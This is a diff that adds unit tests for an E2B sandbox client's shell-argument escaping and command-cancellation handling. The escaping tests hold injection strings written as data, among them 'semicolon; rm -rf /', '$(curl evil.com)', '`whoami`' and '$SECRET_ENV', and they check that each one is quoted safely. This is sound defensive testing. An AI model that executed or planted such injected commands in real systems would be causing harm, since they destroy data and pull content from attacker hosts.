@@ -10,6 +10,8 @@ import {
   loadE2bConfigFromEnv,
   boundCombinedOutput,
   createRealE2bTransport,
+  escapeShellArg,
+  buildShellCommandLine,
   type E2bSdkSeam,
 } from '../../src/modules/agent/e2b-provider.js';
 import {
@@ -1378,6 +1380,768 @@ describe('E2B Cloud Sandbox Provider Client (17T-69)', () => {
       assert.equal(client.isEnabled, true);
       assert.equal(client.isConfigured, true);
       assert.equal(client.providerName, 'e2b');
+    });
+  });
+
+  // 23. Command Argument Escaping & Injection Fencing (P1 Finding)
+  describe('23. Command argument escaping and shell injection fencing (P1 Finding)', () => {
+    it('escapeShellArg wraps in single quotes and escapes single quotes cleanly', () => {
+      // Basic words
+      assert.equal(escapeShellArg('hello'), "'hello'");
+      assert.equal(escapeShellArg(''), "''");
+
+      // Spaces
+      assert.equal(escapeShellArg('hello world'), "'hello world'");
+
+      // Single quotes
+      assert.equal(escapeShellArg("it's"), "'it'\\''s'");
+      assert.equal(escapeShellArg("foo'bar'baz"), "'foo'\\''bar'\\''baz'");
+
+      // Double quotes
+      assert.equal(escapeShellArg('"quoted"'), '\'"quoted"\'');
+
+      // Metacharacters: semicolons, pipes, ampersands, redirections
+      assert.equal(escapeShellArg('foo; rm -rf /'), "'foo; rm -rf /'");
+      assert.equal(escapeShellArg('a | b && c || d > e < f &'), "'a | b && c || d > e < f &'");
+
+      // Shell expansions: variables and command substitution
+      assert.equal(escapeShellArg('$HOME'), "'$HOME'");
+      assert.equal(escapeShellArg('${USER}'), "'${USER}'");
+      assert.equal(escapeShellArg('$(whoami)'), "'$(whoami)'");
+      assert.equal(escapeShellArg('`id`'), "'`id`'");
+
+      // Newlines and backslashes
+      assert.equal(escapeShellArg('line1\nline2'), "'line1\nline2'");
+      assert.equal(escapeShellArg('C:\\path\\file'), "'C:\\path\\file'");
+    });
+
+    it('buildShellCommandLine escapes arguments exactly once without duplicating or pre-concatenating', () => {
+      // No arguments
+      assert.equal(buildShellCommandLine('git status'), 'git status');
+      assert.equal(buildShellCommandLine('ls -la'), 'ls -la');
+      assert.equal(buildShellCommandLine('echo', []), 'echo');
+
+      // Multiple arguments
+      assert.equal(
+        buildShellCommandLine('git', ['commit', '-m', 'Initial commit']),
+        "git 'commit' '-m' 'Initial commit'"
+      );
+
+      // Arguments with quotes and spaces
+      assert.equal(
+        buildShellCommandLine('echo', ["it's a test", '"quoted"']),
+        "echo 'it'\\''s a test' '\"quoted\"'"
+      );
+    });
+
+    it('executeCommand and real transport pass arguments cleanly to SDK seam exactly once without duplication or injection', async () => {
+      const capturedCommands: string[] = [];
+
+      const seam: E2bSdkSeam = {
+        Sandbox: {
+          async create() {
+            return {
+              sandboxId: 'e2b-sbx-args-test',
+              commands: {
+                async run(cmd: string) {
+                  capturedCommands.push(cmd);
+                  return {
+                    exitCode: 0,
+                    stdout: 'Command executed successfully',
+                    stderr: '',
+                    error: undefined,
+                  };
+                },
+              },
+              files: {
+                async read() { return ''; },
+                async write() {},
+                async list() { return []; },
+              },
+              async kill() {},
+            };
+          },
+        },
+      };
+
+      const transport = createRealE2bTransport(seam);
+      const client = new E2bCloudSandboxProviderClient({
+        enabled: true,
+        apiKey: 'e2b_valid_key_123',
+        networkIsolationGuaranteed: true,
+        networkIsolationProof: 'vpc-gw-proof-verified',
+        transport,
+      });
+
+      const { sandboxId } = await client.createSandbox({
+        workspaceId: dummyWorkspaceId,
+        ownerId: dummyOwnerId,
+        timeoutMs: 30_000,
+        networkPolicy: { egressEnabled: true, allowlist: [] },
+      });
+
+      // 1. Command with no arguments
+      await client.executeCommand(sandboxId, { command: 'node -v' });
+      assert.equal(capturedCommands[0], 'node -v');
+
+      // 2. Multiple arguments passed exactly once (not duplicated!)
+      await client.executeCommand(sandboxId, {
+        command: 'git',
+        args: ['commit', '-m', 'feat: initial setup', '--author', 'Alice <alice@test.dev>'],
+      });
+      assert.equal(
+        capturedCommands[1],
+        "git 'commit' '-m' 'feat: initial setup' '--author' 'Alice <alice@test.dev>'"
+      );
+      // Verify no argument duplication: "commit" appears once, not "git commit -m ... 'commit' '-m' ..."
+      const occurrences = (capturedCommands[1]?.match(/commit/g) || []).length;
+      assert.equal(occurrences, 1);
+
+      // 3. Arguments containing spaces, single quotes, double quotes, semicolons, command substitutions
+      const maliciousArgs = [
+        'normal-arg',
+        'with spaces',
+        "single'quote",
+        'double"quote',
+        'semicolon; rm -rf /',
+        '$(curl evil.com)',
+        '`whoami`',
+        '$SECRET_ENV',
+        'pipe | cat',
+        'ampersand & exit',
+      ];
+
+      await client.executeCommand(sandboxId, {
+        command: 'run_tool',
+        args: maliciousArgs,
+      });
+
+      assert.equal(
+        capturedCommands[2],
+        "run_tool 'normal-arg' 'with spaces' 'single'\\''quote' 'double\"quote' 'semicolon; rm -rf /' '$(curl evil.com)' '`whoami`' '$SECRET_ENV' 'pipe | cat' 'ampersand & exit'"
+      );
+
+      // Verify the malicious command is safely enclosed in single quotes as data
+      assert.ok(capturedCommands[2]?.includes("'semicolon; rm -rf /'"));
+      assert.ok(capturedCommands[2]?.includes("'$(curl evil.com)'"));
+      assert.ok(capturedCommands[2]?.includes("'`whoami`'"));
+      assert.ok(capturedCommands[2]?.includes("'$SECRET_ENV'"));
+    });
+  });
+
+  // 24. In-Flight Command Cancellation for Real Transport (P1 Finding)
+  describe('24. In-flight command cancellation for real transport (P1 Finding)', () => {
+    it('cancels in-flight remote command via SDK handle.kill() without terminating sandbox', async () => {
+      let handleKillCalled = false;
+      let sandboxKillCalled = false;
+      let waitResolve: ((res: any) => void) | undefined;
+
+      const seam: E2bSdkSeam = {
+        Sandbox: {
+          async create() {
+            return {
+              sandboxId: 'e2b-sbx-cancel-test',
+              commands: {
+                async run() {
+                  return {
+                    pid: 4321,
+                    async wait() {
+                      return new Promise((resolve) => {
+                        waitResolve = resolve;
+                      });
+                    },
+                    async kill() {
+                      handleKillCalled = true;
+                      if (waitResolve) {
+                        waitResolve({
+                          exitCode: 137,
+                          stdout: '',
+                          stderr: 'Killed by SIGKILL',
+                          error: 'Killed by SIGKILL',
+                        });
+                      }
+                      return true;
+                    },
+                  };
+                },
+              },
+              files: {
+                async read() { return ''; },
+                async write() {},
+                async list() { return []; },
+              },
+              async kill() {
+                sandboxKillCalled = true;
+              },
+            };
+          },
+        },
+      };
+
+      const transport = createRealE2bTransport(seam);
+      const client = new E2bCloudSandboxProviderClient({
+        enabled: true,
+        apiKey: 'e2b_valid_key_123',
+        networkIsolationGuaranteed: true,
+        networkIsolationProof: 'vpc-gw-proof-verified',
+        transport,
+      });
+
+      const { sandboxId } = await client.createSandbox({
+        workspaceId: dummyWorkspaceId,
+        ownerId: dummyOwnerId,
+        timeoutMs: 30_000,
+        networkPolicy: { egressEnabled: true, allowlist: [] },
+      });
+
+      const ac = new AbortController();
+
+      // Launch command asynchronously
+      const execPromise = client.executeCommand(sandboxId, {
+        command: 'sleep 30',
+        signal: ac.signal,
+      });
+
+      // Give event loop a cycle so command starts and enters wait()
+      await new Promise((r) => setImmediate(r));
+
+      // Trigger in-flight cancellation
+      ac.abort();
+
+      await assert.rejects(
+        execPromise,
+        (err: unknown) => {
+          assert.ok(err instanceof E2bProviderError);
+          assert.equal(err.code, 'EXECUTION_ABORTED');
+          return true;
+        }
+      );
+
+      // Verify handle.kill() was called to terminate the remote process
+      assert.equal(handleKillCalled, true);
+      // Since individual command kill succeeded, sandbox VM itself was NOT killed
+      assert.equal(sandboxKillCalled, false);
+      assert.equal(client.getSandboxStatus(sandboxId), 'active');
+    });
+
+    it('falls back to terminating sandbox when individual command cancellation fails or is unsupported', async () => {
+      let sandboxKillCalled = false;
+
+      const seam: E2bSdkSeam = {
+        Sandbox: {
+          async create() {
+            return {
+              sandboxId: 'e2b-sbx-fallback-cancel',
+              commands: {
+                async run() {
+                  return {
+                    pid: 9999,
+                    async wait() {
+                      return new Promise(() => {
+                        // Never resolves naturally
+                      });
+                    },
+                    async kill() {
+                      // Simulate failure to cancel individual command
+                      throw new Error('RPC error: process kill failed');
+                    },
+                  };
+                },
+              },
+              files: {
+                async read() { return ''; },
+                async write() {},
+                async list() { return []; },
+              },
+              async kill() {
+                sandboxKillCalled = true;
+              },
+            };
+          },
+        },
+      };
+
+      const transport = createRealE2bTransport(seam);
+      const client = new E2bCloudSandboxProviderClient({
+        enabled: true,
+        apiKey: 'e2b_valid_key_123',
+        networkIsolationGuaranteed: true,
+        networkIsolationProof: 'vpc-gw-proof-verified',
+        transport,
+      });
+
+      const { sandboxId } = await client.createSandbox({
+        workspaceId: dummyWorkspaceId,
+        ownerId: dummyOwnerId,
+        timeoutMs: 30_000,
+        networkPolicy: { egressEnabled: true, allowlist: [] },
+      });
+
+      const ac = new AbortController();
+
+      const execPromise = client.executeCommand(sandboxId, {
+        command: 'hanging-binary',
+        signal: ac.signal,
+      });
+
+      await new Promise((r) => setImmediate(r));
+
+      // Trigger abort while running
+      ac.abort();
+
+      await assert.rejects(
+        execPromise,
+        (err: unknown) => {
+          assert.ok(err instanceof E2bProviderError);
+          assert.equal(err.code, 'EXECUTION_ABORTED');
+          return true;
+        }
+      );
+
+      // Verify fallback was triggered: sandbox was terminated to guarantee process stops!
+      assert.equal(sandboxKillCalled, true);
+
+      // Verify subsequent commands fail closed because sandbox was terminated
+      await assert.rejects(
+        client.executeCommand(sandboxId, { command: 'echo 1' }),
+        (err: unknown) => {
+          assert.ok(err instanceof E2bProviderError);
+          assert.equal(err.code, 'PROVIDER_ERROR');
+          assert.match(err.message, /terminated/i);
+          return true;
+        }
+      );
+    });
+
+    it('ensures cancellation race cannot return stale success if remote completes concurrently with abort', async () => {
+      const seam: E2bSdkSeam = {
+        Sandbox: {
+          async create() {
+            return {
+              sandboxId: 'e2b-sbx-race-test',
+              commands: {
+                async run() {
+                  return {
+                    pid: 1234,
+                    async wait() {
+                      // Resolves successfully
+                      return {
+                        exitCode: 0,
+                        stdout: 'SUCCESS RESULT SHOULD BE DISCARDED',
+                        stderr: '',
+                      };
+                    },
+                    async kill() { return true; },
+                  };
+                },
+              },
+              files: {
+                async read() { return ''; },
+                async write() {},
+                async list() { return []; },
+              },
+              async kill() {},
+            };
+          },
+        },
+      };
+
+      const transport = createRealE2bTransport(seam);
+      const client = new E2bCloudSandboxProviderClient({
+        enabled: true,
+        apiKey: 'e2b_valid_key_123',
+        networkIsolationGuaranteed: true,
+        networkIsolationProof: 'vpc-gw-proof-verified',
+        transport,
+      });
+
+      const { sandboxId } = await client.createSandbox({
+        workspaceId: dummyWorkspaceId,
+        ownerId: dummyOwnerId,
+        timeoutMs: 30_000,
+        networkPolicy: { egressEnabled: true, allowlist: [] },
+      });
+
+      const ac = new AbortController();
+
+      // Abort right before or at execution resolution
+      ac.abort();
+
+      await assert.rejects(
+        client.executeCommand(sandboxId, { command: 'race-command', signal: ac.signal }),
+        (err: unknown) => {
+          assert.ok(err instanceof E2bProviderError);
+          assert.equal(err.code, 'EXECUTION_ABORTED');
+          return true;
+        }
+      );
+    });
+
+    it('fails closed with PROVIDER_ERROR and retains sandbox for retry when both command kill and sandbox kill fail (P1 Finding)', async () => {
+      let sandboxKillAttempts = 0;
+      let allowSandboxKillToSucceed = false;
+
+      const seam: E2bSdkSeam = {
+        Sandbox: {
+          async create() {
+            return {
+              sandboxId: 'e2b-sbx-double-fail',
+              commands: {
+                async run() {
+                  return {
+                    pid: 8888,
+                    async wait() {
+                      return new Promise(() => {
+                        // Hanging command
+                      });
+                    },
+                    async kill() {
+                      // 1. Command kill fails
+                      throw new Error('RPC error: process kill failed');
+                    },
+                  };
+                },
+              },
+              files: {
+                async read() { return ''; },
+                async write() {},
+                async list() { return []; },
+              },
+              async kill() {
+                sandboxKillAttempts++;
+                if (!allowSandboxKillToSucceed) {
+                  // 2. Sandbox kill also fails!
+                  throw new Error('E2B API unreachable: sandbox kill failed');
+                }
+              },
+            };
+          },
+        },
+      };
+
+      const transport = createRealE2bTransport(seam);
+      const client = new E2bCloudSandboxProviderClient({
+        enabled: true,
+        apiKey: 'e2b_valid_key_123',
+        networkIsolationGuaranteed: true,
+        networkIsolationProof: 'vpc-gw-proof-verified',
+        transport,
+      });
+
+      const { sandboxId } = await client.createSandbox({
+        workspaceId: dummyWorkspaceId,
+        ownerId: dummyOwnerId,
+        timeoutMs: 30_000,
+        networkPolicy: { egressEnabled: true, allowlist: [] },
+      });
+
+      const ac = new AbortController();
+
+      const execPromise = client.executeCommand(sandboxId, {
+        command: 'uncooperative-cmd',
+        signal: ac.signal,
+      });
+
+      await new Promise((r) => setImmediate(r));
+
+      // Trigger abort while running
+      ac.abort();
+
+      // Must NOT report EXECUTION_ABORTED when both cancellations failed!
+      await assert.rejects(
+        execPromise,
+        (err: unknown) => {
+          assert.ok(err instanceof E2bProviderError);
+          // Fails closed with PROVIDER_ERROR, NOT EXECUTION_ABORTED
+          assert.equal(err.code, 'PROVIDER_ERROR');
+          assert.match(err.message, /Command cancellation failed and sandbox cleanup failed/);
+          return true;
+        }
+      );
+
+      // Verify sandbox was NOT marked destroyed (remote process not confirmed stopped)
+      assert.equal(client.getSandboxStatus(sandboxId), 'active');
+      assert.equal(sandboxKillAttempts, 1);
+
+      // Verify retry reconciliation can clean up once provider recovers
+      allowSandboxKillToSucceed = true;
+      await client.destroySandbox(sandboxId);
+
+      // Now confirmed destroyed
+      assert.equal(client.getSandboxStatus(sandboxId), 'destroyed');
+      assert.equal(sandboxKillAttempts, 2);
+    });
+
+    it('does not terminate sandbox when command kill returns false because process already exited (P2 Finding)', async () => {
+      let sandboxKillCalled = false;
+      let handleKillCalled = false;
+
+      const seam: E2bSdkSeam = {
+        Sandbox: {
+          async create() {
+            return {
+              sandboxId: 'e2b-sbx-p2-check',
+              commands: {
+                async run() {
+                  return {
+                    pid: 7777,
+                    async wait() {
+                      return new Promise((resolve) => {
+                        // Simulates command finishing right before or during abort
+                        setTimeout(() => {
+                          resolve({
+                            exitCode: 0,
+                            stdout: 'done',
+                            stderr: '',
+                          });
+                        }, 5);
+                      });
+                    },
+                    async kill() {
+                      handleKillCalled = true;
+                      // Process not found because it already exited
+                      return false;
+                    },
+                  };
+                },
+                async list() {
+                  // Process is not running
+                  return [];
+                },
+              },
+              files: {
+                async read() { return ''; },
+                async write() {},
+                async list() { return []; },
+              },
+              async kill() {
+                sandboxKillCalled = true;
+              },
+            };
+          },
+        },
+      };
+
+      const transport = createRealE2bTransport(seam);
+      const client = new E2bCloudSandboxProviderClient({
+        enabled: true,
+        apiKey: 'e2b_valid_key_123',
+        networkIsolationGuaranteed: true,
+        networkIsolationProof: 'vpc-gw-proof-verified',
+        transport,
+      });
+
+      const { sandboxId } = await client.createSandbox({
+        workspaceId: dummyWorkspaceId,
+        ownerId: dummyOwnerId,
+        timeoutMs: 30_000,
+        networkPolicy: { egressEnabled: true, allowlist: [] },
+      });
+
+      const ac = new AbortController();
+
+      const execPromise = client.executeCommand(sandboxId, {
+        command: 'quick-exit-cmd',
+        signal: ac.signal,
+      });
+
+      await new Promise((r) => setImmediate(r));
+      ac.abort();
+
+      await assert.rejects(
+        execPromise,
+        (err: unknown) => {
+          assert.ok(err instanceof E2bProviderError);
+          assert.equal(err.code, 'EXECUTION_ABORTED');
+          return true;
+        }
+      );
+
+      // Verify kill was attempted on handle
+      assert.equal(handleKillCalled, true);
+      // P2: Verify sandbox was NOT terminated unnecessarily!
+      assert.equal(sandboxKillCalled, false);
+      assert.equal(client.getSandboxStatus(sandboxId), 'active');
+    });
+
+    it('falls back to terminating sandbox when command kill returns false and commands.list fails (Blocker Finding)', async () => {
+      let sandboxKillCalled = false;
+      let handleKillCalled = false;
+
+      const seam: E2bSdkSeam = {
+        Sandbox: {
+          async create() {
+            return {
+              sandboxId: 'e2b-sbx-unconfirmed-list-error',
+              commands: {
+                async run() {
+                  return {
+                    pid: 6666,
+                    async wait() {
+                      return new Promise(() => {
+                        // Hanging command
+                      });
+                    },
+                    async kill() {
+                      handleKillCalled = true;
+                      // Returns false (not found by SIGKILL)
+                      return false;
+                    },
+                  };
+                },
+                async list() {
+                  // Querying process table fails with RPC/network error
+                  throw new Error('RPC error: failed to query sandbox processes');
+                },
+              },
+              files: {
+                async read() { return ''; },
+                async write() {},
+                async list() { return []; },
+              },
+              async kill() {
+                sandboxKillCalled = true;
+              },
+            };
+          },
+        },
+      };
+
+      const transport = createRealE2bTransport(seam);
+      const client = new E2bCloudSandboxProviderClient({
+        enabled: true,
+        apiKey: 'e2b_valid_key_123',
+        networkIsolationGuaranteed: true,
+        networkIsolationProof: 'vpc-gw-proof-verified',
+        transport,
+      });
+
+      const { sandboxId } = await client.createSandbox({
+        workspaceId: dummyWorkspaceId,
+        ownerId: dummyOwnerId,
+        timeoutMs: 30_000,
+        networkPolicy: { egressEnabled: true, allowlist: [] },
+      });
+
+      const ac = new AbortController();
+
+      const execPromise = client.executeCommand(sandboxId, {
+        command: 'unverifiable-cmd',
+        signal: ac.signal,
+      });
+
+      await new Promise((r) => setImmediate(r));
+      ac.abort();
+
+      await assert.rejects(
+        execPromise,
+        (err: unknown) => {
+          assert.ok(err instanceof E2bProviderError);
+          assert.equal(err.code, 'EXECUTION_ABORTED');
+          return true;
+        }
+      );
+
+      // Verify individual kill was attempted
+      assert.equal(handleKillCalled, true);
+      // Because commands.list failed, process state was UNCONFIRMED!
+      // System MUST fall back to terminating the entire sandbox VM!
+      assert.equal(sandboxKillCalled, true);
+      assert.equal(client.getSandboxStatus(sandboxId), 'destroyed');
+    });
+
+    it('fails closed with PROVIDER_ERROR when command kill returns false, commands.list fails AND sandbox kill fails (Blocker Finding)', async () => {
+      let sandboxKillAttempts = 0;
+      let allowSandboxKillToSucceed = false;
+
+      const seam: E2bSdkSeam = {
+        Sandbox: {
+          async create() {
+            return {
+              sandboxId: 'e2b-sbx-unconfirmed-all-fail',
+              commands: {
+                async run() {
+                  return {
+                    pid: 5555,
+                    async wait() {
+                      return new Promise(() => {
+                        // Hanging command
+                      });
+                    },
+                    async kill() {
+                      // Returns false (unconfirmed)
+                      return false;
+                    },
+                  };
+                },
+                async list() {
+                  // Querying process table fails
+                  throw new Error('RPC error: failed to query sandbox processes');
+                },
+              },
+              files: {
+                async read() { return ''; },
+                async write() {},
+                async list() { return []; },
+              },
+              async kill() {
+                sandboxKillAttempts++;
+                if (!allowSandboxKillToSucceed) {
+                  throw new Error('E2B API unreachable: sandbox termination failed');
+                }
+              },
+            };
+          },
+        },
+      };
+
+      const transport = createRealE2bTransport(seam);
+      const client = new E2bCloudSandboxProviderClient({
+        enabled: true,
+        apiKey: 'e2b_valid_key_123',
+        networkIsolationGuaranteed: true,
+        networkIsolationProof: 'vpc-gw-proof-verified',
+        transport,
+      });
+
+      const { sandboxId } = await client.createSandbox({
+        workspaceId: dummyWorkspaceId,
+        ownerId: dummyOwnerId,
+        timeoutMs: 30_000,
+        networkPolicy: { egressEnabled: true, allowlist: [] },
+      });
+
+      const ac = new AbortController();
+
+      const execPromise = client.executeCommand(sandboxId, {
+        command: 'double-unverifiable-cmd',
+        signal: ac.signal,
+      });
+
+      await new Promise((r) => setImmediate(r));
+      ac.abort();
+
+      // Because process state could not be verified AND sandbox kill failed,
+      // system MUST NOT report EXECUTION_ABORTED! It must fail closed with PROVIDER_ERROR!
+      await assert.rejects(
+        execPromise,
+        (err: unknown) => {
+          assert.ok(err instanceof E2bProviderError);
+          assert.equal(err.code, 'PROVIDER_ERROR');
+          assert.match(err.message, /Command cancellation failed and sandbox cleanup failed/);
+          return true;
+        }
+      );
+
+      // Verify sandbox is retained in active registry with cleanup pending
+      assert.equal(client.getSandboxStatus(sandboxId), 'active');
+      assert.equal(sandboxKillAttempts, 1);
+
+      // Verify retry reconciliation can clean up once provider recovers
+      allowSandboxKillToSucceed = true;
+      await client.destroySandbox(sandboxId);
+      assert.equal(client.getSandboxStatus(sandboxId), 'destroyed');
+      assert.equal(sandboxKillAttempts, 2);
     });
   });
 });
